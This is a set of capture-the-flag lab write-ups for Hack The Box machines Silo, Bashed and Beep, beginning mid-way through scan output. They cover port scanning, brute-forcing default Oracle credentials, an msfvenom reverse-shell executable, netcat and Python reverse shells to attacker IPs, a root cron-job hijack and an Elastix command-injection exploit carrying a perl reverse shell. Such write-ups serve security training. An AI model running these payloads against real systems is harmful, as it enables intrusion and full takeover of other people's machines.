by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 12:30:10 Starting gobuster
===============================================================
http://10.10.10.82:80/aspnet_client (Status: 301) [Size: 159]
===============================================================
2020/02/23 12:32:56 Finished
===============================================================Finished gobuster scan                                                                                                                                                                                                                                                                                                                     
=========================
                                                                                                                                                    
Starting gobuster scan
                                                                                                                                                    
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:5985
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 12:48:56 Starting gobuster
===============================================================
===============================================================
2020/02/23 12:50:47 Finished
===============================================================Finished gobuster scan                                                                                                                       
=========================
                                                                                                                                                    
                                                                                                                                                    
Starting gobuster scan
                                                                                                                                                    
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:47001
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 13:23:17 Starting gobuster
===============================================================
===============================================================
2020/02/23 13:25:25 Finished
===============================================================Finished gobuster scan
                                                                                                                                                    
                                                                                                                                                    
Starting smbmap scan
                                                                                                                                                    
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.82
[!] Authentication error on 10.10.10.82Finished smbmap scan
                                                                                                                                                    
=========================
                                                                                                                                                    
Starting smbclient scan
                                                                                                                                                    
session setup failed: NT_STATUS_ACCOUNT_DISABLEDFinished smbclient scan
                                                                                                                                                    
=========================
                                                                                                                                                    
Starting nmap scan
                                                                                                                                                    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 13:38 EST
Nmap scan report for 10.10.10.82
Host is up (0.039s latency).PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)Host script results:
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: No accounts left to tryNmap done: 1 IP address (1 host up) scanned in 24.20 secondsFinished nmap scan
                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                    
---------------------Finished all Nmap scans---------------------Completed in 1 hour(s), 47 minute(s) and 6 second(s)
```

We have fifteen open ports.

* **Port 80:** running Microsoft-IIS/8.5
* **Ports 135, 49152, 49153, 49154, 49155,49158, 49161 & 49162:** running Microsoft Windows RPC
* **Ports 139 & 445:** running Samba
* **Ports 1521 & 4196:** running Oracle TNS listener
* **Ports 5985 & 47001:** running Microsoft HTTP API httpd 2.0

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Port 80 is running a Microsoft IIS server. A quick google search tells us that the OS is probably Windows Server 2012 R2. The gobuster scan didn’t really find anything useful for this web server.
* The nmap scan reported a “_guest_” account for SMB, however, the smbclient scan reported an “_NT\_STATUS\_ACCOUNT\_DISABLED_” status, so I doubt we’ll be able to access any of the shares. We can check this manually.
* Ports 1521 & 4196 are running Oracle TNS listener. This is the database server software component that manages the network traffic between the Oracle Database and the client. If we manage to get access to this service with an account that has administrative privileges, we can potentially execute code on the box. The nmapAutomator script uses the Oracle Database Attacking Tool \(ODAT\) to enumerate the system ID and usernames/passwords. However, since the box kept crashing, I terminated the scan. We’ll do our own manual enumeration using this tool.

## Enumeration <a id="c516"></a>

If you don’t have ODAT installed on kali, the installation instructions can be found [here](https://github.com/quentinhardy/odat#installation-optional-for-development-version).

The first thing we need to enumerate is the Oracle System ID \(SID\) string. This is a string that is used to uniquely identify a particular database on a system. This can be done using the _sidguesser_ module in ODAT.

```text
python3 odat.py sidguesser -s 10.10.10.82 -p 1521
```

This takes a while, but it does find 4 valid SID strings.

```text
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB,SA,SB
```

We’ll use the first one: _XE_.

The second thing to do is enumerate valid credentials. This can be done using the _passwordguesser_ module in ODAT. I tried both account files that come with the ODAT installation, however, the tool didn’t find any valid credentials. So instead, let’s locate the credential list that the Metasploit framework uses.

```text
root@kali:~/Desktop/tools/odat# locate oracle_default_userpass.txt
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
```

Copy it into the ODAT _accounts_ directory.

```text
root@kali:~/Desktop/tools/odat# cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt accounts/
```

The username and passwords in this list are separated by a space instead of a forward slash \(/\). We’ll have to change it to forward slash so that the ODAT tool is able to parse the file. This can be done in vi using the following command.

```text
 :%s/ /\//g
```

Now that we have a proper list, we can use the _passwordguesser_ module to brute force credentials.

```text
python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt
```

Again, this also takes a while but it ends up finding credentials!

```text
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger
```

If you look at the [Oracle documentation](https://docs.oracle.com/cd/B19306_01/install.102/b15660/rev_precon_db.htm), the username/password that we found are actually one of the default credentials used when setting up Oracle. Now that we have a valid SID and username/password, let’s see if we can get code execution on the box.

## Exploitation <a id="03d0"></a>

ODAT has a _utlfile_ module that allows you to upload, download or delete a file. Since we are trying to get code execution on the box, let’s upload a malicious executable that sends a reverse shell back to our attack machine.

First, generate the executable using msfvenom.

```text
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.7 LPORT=1234 -f exe > shell.exe
```

Next, upload the file using the _utlfile_ module.

```text
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe
```

We get the following error.

```text
[-] Impossible to put the ../../htb/silo/shell.exe file: `ORA-01031: insufficient privileges`
```

We don’t have sufficient privileges to upload a file. Let’s see if the user was given _sysdba_ privileges by adding the _sysdba_ flag to our command.

```text
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe --sysdba
```

Now we need to execute the file. We can do that using the _externaltable_ module in ODAT.

First setup a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Next, execute the file using the following command.

```text
python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
```

We get a shell!

![](https://miro.medium.com/max/834/1*M3cgHNR6Wur9aNX9TBwQjQ.png)

The database must have been running with SYSTEM privileges and so we got a shell as SYSTEM.

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/614/1*rKfcd2xVS2Aqrw_p903Yzw.png)

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/615/1*csWE8hku7mMusqOpJLROPg.png)

**Note:** IppSec has a [great video](https://www.youtube.com/watch?v=2c7SzNo9uoA) explaining how to do this manually without having to use ODAT or Metasploit. He also goes through the intended solution for the box which is much harder than the way I solved it.

## Lessons Learned <a id="a815"></a>

To get SYSTEM on this box, we exploited two vulnerabilities.

1. Use of Default Credentials. There was an exposed port that was running Oracle TNS listener. The administrator had used default credentials for a user that had sysdba \(privileged\) access. This allowed us to login as that user and execute malicious code on the box. Since default credentials are publicly available and can be easily obtained, the administrator should have instead used a sufficiently long password that is difficult to crack.
2. Least Privilege Violation. Oracle doesn’t need SYSTEM privileges to function properly. Instead it should have been run under a normal user account that has limited privileges. This way, even if we did get access to the box, we would have needed to find a way to escalate privileges, instead of immediately getting SYSTEM access without having to work for it. The administrator should have conformed to the principle of least privilege.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
bashed-writeup-w-o-metasploit.md
# Bashed Writeup w/o Metasploit

![](https://miro.medium.com/max/586/1*2mXiaBfDCP6jPMcMpxUG8Q.png)

## Reconnaissance <a id="9596"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.68
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that port 80 is open with Apache HTTP Server running on it.

![](https://miro.medium.com/max/904/1*vVJ-w6P4zwTyQi1kfLDYNg.png)

Before we start investigating port 80, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p1–65535 -oA nmap/full 10.10.10.68
```

We get back the following result. Now we’re sure that port 80 is the only port that is open.

![](https://miro.medium.com/max/914/1*cu-lg6eoZ-wcCIOPzVOqVA.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -oA nmap/udp 10.10.10.68
```

We get back the following result. As can be seen, the top 1000 ports are closed.

![](https://miro.medium.com/max/813/1*pIzrOLKq-fQbkGeUtVMmKQ.png)

Our only avenue of attack is port 80, so let’s check it out.

## Enumeration <a id="ca15"></a>

Head over to [http://10.10.10.68](http://10.10.10.68/) \(defaults to port 80\).

![](https://miro.medium.com/max/1046/1*aXAG-nld0e8Jh9GDCdtUjw.png)

The arrow on the first page leads us to [http://10.10.10.68/single.html](http://10.10.10.68/single.html). There, you can find a link to a GitHub repository explaining that this is a script used to create a semi-interactive web shell. Interesting! If we find the phpbash.php file, we can potentially get a web shell!

![](https://miro.medium.com/max/1015/1*E5N4VTc8XPGhncoNHWeSDg.png)

Let’s do more enumeration on the web server. Run gobuster to enumerate directories.

```text
gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.68
```

* **-t**: number of threads
* **-w**: wordlist
* **-u**: specify the URL
* **dir**: uses directory/file brute forcing mode

The directories _/images_, _/uploads_, _/php_ and _/css_ lead us nowhere. So let’s move on to the _/dev_ directory.

![](https://miro.medium.com/max/856/1*b19auN1AX7gK-psD3_ZfKA.png)

We found the _phpbash.php_ script and clicking on it gives us a web shell!

## Gaining a foothold <a id="b35b"></a>

What exactly does this shell do and in what context does it run?

```text
whoamiiduname -a
```

* _whoami_: print effective userid
* _id_: print real and effective user and group IDs
* _uname -a_: print system information

![](https://miro.medium.com/max/863/1*q4YuzsyXE3obhg__TIRCBw.png)

We’re running in the context of an Apache default user _www-data_. For this machine, we already have a low privileged shell that allows us to run linux commands on the web server, so we don’t necessarily need to get our own reverse shell. However, in a real penetration test, you would place your own shell in the system just in case the creator notices his insecure configuration and takes down the php script. This way you’ll have consistent access to the system by a shell that you control.

Since we’re modelling a real penetration test, let’s get a reverse shell going. In the attack machine \(kali\) set up a listener.

```text
nc -nlvp 4444
```

In the target machine \(bashed\) send a reverse shell to the attack machine.

```text
nc -nv 10.10.14.30 4444 -e /bin/sh
```

Unfortunately, the connection keeps terminating. Let’s try sending a reverse shell in a different way.

P[entestmonkey](http://pentestmonkey.net/) has a comprehensive list of reverse shells. Check if python exists on the target machine.

```text
which python
```

Since we get back a result, python is installed on the machine! Copy the python command from the list and change it to your attack machine’s ip address and listening port.

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Yes! We have a reverse shell going.

![](https://miro.medium.com/max/572/1*Dhh9U-8MkrDDLqwYatscEg.png)

Let’s find the user flag. Change to the home directory and view its contents.

![](https://miro.medium.com/max/689/1*995ncW6rXg-akMu6lKExFw.png)

I have execute privileges on both arrexel and scriptmanager directories. Let’s look in the arrexel directory first.

![](https://miro.medium.com/max/664/1*k0C_W6cozluyc7XbvHB81Q.png)

We found the user flag!

![](https://miro.medium.com/max/754/1*WC5JizLuuWnt-98615olLw.png)

## Privilege Escalation <a id="00cd"></a>

Next, I need to figure out what other privileges I have or can easily get. The following command lists the allowed commands for my user.

![](https://miro.medium.com/max/740/1*gcJPmbEZ5Z-i6_vSm6b-kA.png)

The last two lines are particularly interesting because they say that the user I’m running in the context of \(www-data\) can run as the user scriptmanager without having to provide the user’s password. This might come in handy later on.

For the time being, let’s do some more enumeration.

![](https://miro.medium.com/max/997/1*fMNnau8mZyTE7QqtZ4aHfQ.png)

Everything in the root directory seems to be owned by root except for the **scripts** directory which is owned by scriptmanager. In the previous step we found out that we can run as scriptmanager without a password.

```text
sudo -i -u scriptmanager
```

The above command changes the user to scriptmanager.

![](https://miro.medium.com/max/692/1*BeZT9yzKvHXu8YJaxohz6w.png)

Now that we’re running in the context of scriptmanager, we have read/write/execute privileges in the **scripts** directory.

![](https://miro.medium.com/max/665/1*u5zByyu2IyWFR99zfhFBVw.png)

We have two files; one owned by us \(test.py\) and the other owned by root \(test.txt\). Let’s print out the content of test.py.

![](https://miro.medium.com/max/701/1*toBKYot6VKH19KT-Sb24jw.png)

Interesting! It’s a simple python program that writes to the file test.txt. However, we saw in the previous image that test.txt is running as root! Running the python program also seems to be something that is scheduled since the last access time of the test.txt file is very recent. In fact, the script seems to be executing every minute! It’s probably a cron job that is owned by root.

Why is that great news for us? If I change the contents in the test.py file to send a reverse shell, that reverse shell will run as root!

Changing the file on the shell was unbelievably difficult and glitchy. Therefore, I decided to transfer the file from my attack \(kali\) machine.

In the kali machine, create a test.py file and add the reverse shell code to it.

```text
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((“10.10.14.30”,5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);
```

Change the file permission to rwx for everyone.

```text
chmod 777 test.py
```

In the same directory, start a simple HTTP server.

```text
python -m SimpleHTTPServer 9005
```

In the target \(bashed\) machine under the **scripts** directory, download the file.

wget [http://10.10.14.30:9005/test.py](http://10.10.14.30:9005/python-reverse-shell.py)

Now, go back to your attack \(kali\) vm and start up a listener with the same port specified in the test.py script.

```text
nc -lnvp 5555
```

Wait for a minute or so for the cron job to execute and voila! We have a shell running as root!

![](https://miro.medium.com/max/585/1*fRXTyuTkIUPS45ALZ6eueQ.png)

Change to the root directory and get the root flag.

![](https://miro.medium.com/max/610/1*5EA5pGAnPd4rI6KJG8uz7Q.png)

## Lessons Learned <a id="5d39"></a>

1. The developer should not have had a web shell that publicly gives access to his system. This one is a no brainer and is probably something you won’t see in real life.
2. Misconfiguring permissions can lead to disastrous consequences. Why was the web daemon user \(www-data\) allowed to become a more privileged user \(scriptmanager\)? Similarly, why was a non-root user created script \(test.py\) executed as root? These are known as security misconfigurations. The developer should have conformed to the principle of least privilege and the concept of separation of privileges.
3. What allowed us to get an initial foothold, is the fact that we found the /dev directory that contained the web shell. I imagine the developer thought no one would find this directory since it is not directly linked on the website. However, gobuster found it in mere minutes. The developer should not have sensitive publicly accessible directories available on his server.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
beep-writeup-w-o-metasploit.md
# Beep Writeup w/o Metasploit

![](https://miro.medium.com/max/582/1*tC-eadp-7CCSqm75hloqYg.png)

## Reconnaissance <a id="e462"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.7
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 12 ports are open:

* **Port 22:** running OpenSSH 4.3
* **Port 25:** running Postfix smtpd
* **Port 80:** running Apache httpd 2.2.3
* **Port 110:** running Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7–7.el5\_6.4
* **Port 111:** running rpcbind
* **Port 143**: running Cyrus imapd 2.3.7-Invoca-RPM-2.3.7–7.el5\_6.4
* **Port 443:** running HTTPS
* **Port 993:** running Cyrus imapd
* **Port 995:** running Cyrus pop3d
* **Port 3306:** running MySQL
* **Port 4445:** running upnotifyp
* **Port 10000:** running MiniServ 1.570 \(Webmin httpd\)

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 23:32 EST
Nmap scan report for 10.10.10.7
Host is up (0.040s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
*22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
*25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
*110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: STLS EXPIRE(NEVER) TOP UIDL IMPLEMENTATION(Cyrus POP3 server v2) PIPELINING USER RESP-CODES AUTH-RESP-CODE LOGIN-DELAY(0) APOP
*111/tcp   open  rpcbind    2 (RPC #100000)
*143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: RIGHTS=kxte ATOMIC CONDSTORE Completed IMAP4 IMAP4rev1 NAMESPACE MULTIAPPEND CHILDREN ACL OK CATENATE URLAUTHA0001 STARTTLS LISTEXT QUOTA THREAD=REFERENCES IDLE LIST-SUBSCRIBED ANNOTATEMORE X-NETSCAPE BINARY THREAD=ORDEREDSUBJECT LITERAL+ MAILBOX-REFERRALS SORT=MODSEQ RENAME SORT NO UNSELECT ID UIDPLUS
443/tcp   open  ssl/https?
|_ssl-date: 2019-12-27T05:36:57+00:00; +1h00m57s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
*995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/26%OT=22%CT=1%CU=41448%PV=Y%DS=2%DC=I%G=Y%TM=5E058A
OS:CB%P=x86_64-pc-linux-gnu)SEQ(SP=C1%GCD=1%ISR=C4%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(
OS:R=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0
OS:%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.comHost script results:
|_clock-skew: 1h00m56sOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 363.19 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.7
```

We get back the following results.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 23:45 EST
Nmap scan report for 10.10.10.7
Host is up (0.040s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) AUTH-RESP-CODE PIPELINING UIDL EXPIRE(NEVER) USER RESP-CODES STLS TOP APOP
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: IDLE MULTIAPPEND CATENATE IMAP4 MAILBOX-REFERRALS Completed SORT=MODSEQ ATOMIC UIDPLUS CONDSTORE X-NETSCAPE RIGHTS=kxte THREAD=REFERENCES URLAUTHA0001 UNSELECT RENAME ANNOTATEMORE ACL NO NAMESPACE IMAP4rev1 QUOTA OK THREAD=ORDEREDSUBJECT SORT ID STARTTLS CHILDREN BINARY LIST-SUBSCRIBED LITERAL+ LISTEXT
443/tcp   open  ssl/https?
|_ssl-date: 2019-12-27T05:50:49+00:00; +1h00m57s from scanner time.
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: UnixHost script results:
|_clock-skew: 1h00m56sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 388.60 seconds
```

Four other ports are open.

* **Port 878:** running status
* **Port 4190:** running Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7–7.el5\_6.4
* **Port 4559:** running HylaFAX 4.3.10
* **Port 5038:** running Asterisk Call Manager 1.1

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.7
```

I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don’t have the UDP scan results.

Before we move on to enumeration, let’s make a few mental notes about the nmap scan results.

* The OpenSSH version that is running on port 22 is pretty old. We’re used to seeing OpenSSH version 7.2. So it would be a good idea to check searchsploit to see if any critical vulnerabilities are associated with this version.
* Ports 25, 110, 143, 995 are running mail protocols. We might need to find a valid email address to further enumerate these services. Port 4190 running Cyrus timsieved 2.3.7 seems to be associated to imapd.
* Port 111 is running RPCbind. I don’t know much about this service but we can start enumerating it using the rpcinfo command that makes a call to the RPC server and reports what it finds. I think port 878 running the status service is associated to this.
* Ports 80, 443 and 10000 are running web servers. Port 80 seems to redirect to port 443 so we only have two web servers to enumerate.
* Port 3306 is running MySQL database. There is a lot of enumeration potential for this service.
* Port 4559 is running HylaFAX 4.3.10. According to [this](https://vulners.com/suse/SUSE-SA:2003:045), HylaFAX is running an open source fax server which allows sharing of fax equipment among computers by offering its service to clients by a protocol similar to FTP. We’ll have to check the version number to see if it is associated with any critical exploits.
* Port 5038 is running running Asterisk Call Manager 1.1. Again, we’ll have to check the version number to see if it is associated with any critical exploits.
* I’m not sure what the upnotifyp service on port 4445 does.

## Enumeration <a id="f86e"></a>

As usual, I always start with enumerating HTTP first. In this case we have two web servers running on ports 443 and 10000.

**Port 443**

Visit the application.

![](https://miro.medium.com/max/955/1*GK_AbgflFen8W_kznDyfhQ.png)

It’s an off the shelf software running [Elastix](https://en.wikipedia.org/wiki/Elastix), which is a unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. The page does not have the version number of the software being used so right click on the site and click on View Page source. We don’t find anything there. Perhaps we can get the version number from one of its directories. Let’s run gobuster on the application.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.7/ -k
```

* **dir:** uses directory/file brute forcing mode
* **-w:** path to the wordlist
* **-u:** target URL or Domain
* **-k:** skip SSL certificate verification

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/27 13:36:46 Starting gobuster
===============================================================
/images (Status: 301)
/help (Status: 301)
/themes (Status: 301)
/modules (Status: 301)
/mail (Status: 301)
/admin (Status: 301)
/static (Status: 301)
/lang (Status: 301)
/var (Status: 301)
/panel (Status: 301)
/libs (Status: 301)
/recordings (Status: 301)
/configs (Status: 301)
/vtigercrm (Status: 301)
```

The directories leak the version of FreePBX \(2.8.1.4\) being used but not the Elastix version number. I also tried common and default credentials on all the login forms I found in the directories and didn’t get anywhere.

Since this is an off the shelf software, the next step would be to run searchsploit to determine if it is associated with any vulnerabilities.

```text
searchsploit elastix
```

We get back the following result.

![](https://miro.medium.com/max/1307/1*cR2fDOHltC-54Z3TUcB3VA.png)

Cross-site scripting exploits are not very useful since they are client side attacks and therefore require end user interaction. The remote code execution \(Solution \#1\) and local file inclusion \(Solution \#2\) vulnerabilities are definitely interesting. The Blind SQL Injection is on the iridium\_threed.php script that the server doesn’t seem to load. Plus it seems like it requires a customer to authenticate, so I’m going to avoid this exploit unless I get valid authentication credentials. The PHP Code Injection exploit is in the vtigercrm directory where the LFI vulnerability exists as well. So we’ll only look into that if the LFI vulnerability does not pan out.

**Port 10000**

Visit the application.

![](https://miro.medium.com/max/672/1*oCpETnw1MCmo6XcOBTgaZQ.png)

This also seems to be an off the shelf software and therefore the first thing I’m going to do is run searchsploit on it.

```text
searchsploit webmin
```

We get back a lot of vulnerabilities!

![](https://miro.medium.com/max/1341/1*nwJUNeZ_6SFzd3IPccF2cQ.png)

One thing to notice is that several of the vulnerabilities mention cgi scripts, which if you read my [Shocker writeup](https://medium.com/@ranakhalil101/hack-the-box-shocker-writeup-w-o-metasploit-feb9e5fa5aa2), you should know that the first thing you should try is the ShellShock vulnerability. This vulnerability affected web servers utilizing CGI \(Common Gateway Interface\), which is a system for generating dynamic web content. If it turns out to be not vulnerable to ShellShock, searchsploit returned a bunch of other exploits we can try.

Based on the results of the enumeration I have done so far, I believe I have enough information to attempt exploiting the machine. If not, we’ll go back and enumerate the other services.

## Solution \#1 <a id="f03a"></a>

This solution involves attacking port 443.

First, transfer the RCE exploit to the attack machine.

```text
searchsploit -m 18650
```

Looking at the code, we need to change the lhost, lport, and rhost.

```text
mport urllib
rhost="10.10.10.7"
lhost="10.10.14.12"
lport=1234
extension="1000"# Reverse shell payload
url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'urllib.urlopen(url)
```

Before we run the script, let’s URL decode the **url** parameter to see what it’s doing.

```text
'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n
Application: system
Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'+str(lhost)+':'+str(lport)+'");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

It seems like a command injection that sends a reverse shell back to our attack machine. Let’s setup a netcat listener on the configured lhost & lport to receive the reverse shell.

```text
nc -nlvp 1234
```

Run the script.

```text
python 18650.py
```

